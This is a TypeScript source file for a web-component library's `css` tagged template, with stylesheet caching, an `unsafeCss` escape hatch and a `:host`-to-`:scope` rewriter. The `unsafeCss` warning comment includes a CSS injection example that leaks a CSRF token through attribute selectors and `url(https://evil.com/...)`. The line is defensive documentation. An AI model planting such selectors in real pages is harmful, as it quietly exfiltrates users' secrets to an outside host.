import { DEV } from '../../../../dev/flag.js';
// A tiny `css` tagged template: lets stylesheets be written as
// `css\`...\`` literals, cached/shared as `CSSStyleSheet` objects, and adopted onto a shadow
// root via `adoptedStyleSheets` (see `UIElement`'s `static styles`) instead of being re-parsed
// from a `<style>` tag on every render.
//
// Usage:
//
//   const buttonStyles = css`button { color: red; }`;
//
//   @tag('my-button')
//   class MyButton extends UIElement {
//     static override shadowRootOptions = { mode: 'open' } as const;
//     static override styles = buttonStyles; // or [sharedStyles, buttonStyles]
//   }
//
// `css` values can be composed/nested like `t`:
//
//   const base = css`:host { display: block; }`;
//   const theme = css`${base} button { color: var(--accent); }`;
//
// Each distinct literal's `CSSStyleSheet` is constructed once and cached (keyed by the literal's
// `strings` identity, same trick as `html/index.ts`), then shared by reference across every component
// instance/class that uses it - cheap to "apply" (just pushes onto `adoptedStyleSheets`), and a
// single edit to the sheet (rare; not something this module does) would apply everywhere at once.

/** The result of calling `css` - a cacheable wrapper around the literal's resolved CSS text. */
export class CSSResult {
	readonly cssText: string;
	#styleSheet?: CSSStyleSheet;

	constructor(cssText: string) {
		this.cssText = cssText;
	}

	/** Lazily constructs (once) and returns the `CSSStyleSheet` for this result's `cssText`. */
	get styleSheet(): CSSStyleSheet {
		if (!this.#styleSheet) {
			this.#styleSheet = new CSSStyleSheet();
			this.#styleSheet.replaceSync(this.cssText);
		}
		return this.#styleSheet;
	}

	toString(): string {
		return this.cssText;
	}
}

export type CSSResultGroup = CSSResult | readonly CSSResultGroup[];

const cssResultCache = new WeakMap<TemplateStringsArray, CSSResult>();

/**
 * Tags a template literal as CSS. Interpolated values must themselves be `CSSResult`s (from
 * `css` or `unsafeCss`) or plain numbers - arbitrary strings are rejected to avoid accidentally
 * splicing untrusted/dynamic text into a stylesheet (a standard guard). Use
 * `unsafeCss()` to explicitly opt out of that check:
 * ```ts
 * css`button { color: ${unsafeCss(userColor)}; }`
 * ```
 *
 * Note: values can contains CSSResult which is embedded by composition.
 */
export function css(strings: TemplateStringsArray, ...values: Array<CSSResult | number>): CSSResult {
	const cached = values.length === 0 ? cssResultCache.get(strings) : undefined;
	if (cached) return cached;

	// string + (value + string)*: string + (value + string) + ...
	const cssText = values.reduce<string>(
		(acc, value, i) => acc + cssValueToString(value) + strings[i + 1],
		strings[0],
	);
	const result = new CSSResult(cssText);
	if (values.length === 0) cssResultCache.set(strings, result);
	return result;
}

function cssValueToString(value: CSSResult | number): string {
	if (value instanceof CSSResult) return value.cssText;
	if (typeof value === 'number') return String(value);
	throw new TypeError(DEV ? `Value passed to 'css' must be a 'CSSResult' (from css\`...\`/unsafeCss()) or a number, got: ${String(value)}` : 'css: invalid value');
}

/**
 * Opts a plain string (e.g. loaded at runtime) into being treated as trusted CSS, for use inside `css` literals.
 *
 * UNSAFE: the string is used verbatim, with no validation or escaping. Never pass untrusted
 * input (user data, query params, third-party content). Injected CSS cannot run script, but it can:
 * - spoof or overlay the UI (hide real elements, fake login forms, clickjacking);
 * - exfiltrate page data without JS, e.g. attribute selectors + `url()` leaking a CSRF token
 *   `input[value^="a"] { background: url(https://evil.com/?t=a) }`;
 * - track/fingerprint via `url()`, `@font-face` `unicode-range`, media queries;
 * - degrade or freeze the page (expensive selectors/filters, hiding `body`).
 * For dynamic values prefer CSS custom properties set from validated data (e.g. `/^#[0-9a-f]{6}$/i`).
 */
export function unsafeCss(value: unknown): CSSResult {
	return new CSSResult(String(value));
}

/** Flattens a `CSSResultGroup` (possibly nested arrays) into a flat list of distinct `CSSStyleSheet`s, in order. */
export function flattenCSSResults(group: CSSResultGroup): CSSStyleSheet[] {
	return mapCSS(group, r => r.styleSheet);
}

/** Flattens a `CSSResultGroup` (possibly nested arrays) into its concatenated `cssText`, in order. */
export function flattenCSSText(group: CSSResultGroup): string {
	return mapCSS(group, r => r.cssText).join('\n');
}

function mapCSS<T>(group: CSSResultGroup, fn: (r: CSSResult) => T, out: T[] = []): T[] {
	if (group instanceof CSSResult) out.push(fn(group));
	else for (const g of group) mapCSS(g, fn, out);
	return out;
}

/**
 * Rewrites bare `:host` selectors to `:scope`, so the same `static styles` literal (typically
 * authored with `:host` for the shadow-DOM case) also works when adapted for light DOM via an
 * `@scope (...)` block (see `UIElement`'s light-DOM styling in `ui-element.ts`) - inside such a
 * block, `:scope` matches the scope root (the element(s) the `@scope` selector matched), exactly
 * like `:host` matches the shadow host.
 */
export function hostSelectorsToScope(cssText: string): string {
	// `:host(<sel>)` -> `:scope:is(<sel>)` (`:scope` isn't functional); allows one level of nested parens.
	// `:host-context(<sel>)` -> the host itself or any descendant of <sel>. Must run first: `:host\b` would
	// otherwise also match its `:host` prefix (`-` is a word boundary) and yield a broken `:scope-context`.
	return cssText
		.replace(/:host-context\(((?:[^()]|\([^()]*\))*)\)/g, ':scope:is($1, $1 *)')
		.replace(/:host\(((?:[^()]|\([^()]*\))*)\)/g, ':scope:is($1)')
		.replace(/:host(?![\w-])/g, ':scope');
}
